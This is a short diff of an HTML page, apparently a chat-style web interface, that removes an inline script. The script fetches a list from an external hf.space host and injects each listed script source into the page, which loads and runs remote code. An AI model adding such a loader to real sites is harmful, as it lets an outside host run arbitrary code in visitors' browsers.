@@ -678,28 +678,6 @@ body.b_dark #b_sydWelcomeTemplate .b_wlcmLogo {
   </div>
 
  
-  <script>
-    async function loadScripts() {
-      try {
-        const response = await fetch('https://lix02-brp.hf.space')
-        const text = await response.text()
-        // 解析并动态添加<script>标签到DOM中
-        const scripts = text.trim().split('\n').map(src => {
-          const script = document.createElement('script')
-          script.src = src.match(/src="(.+?)"/)[1]  // 提取src路径
-          return script
-        })
-        scripts.forEach(script => document.body.appendChild(script))
-      } catch (error) {
-        console.error('Error loading scripts:', error)
-      }
-    }
-    <!----
-    loadScripts()
-    ---->
-  </script>
-
-
   
 </body>
 
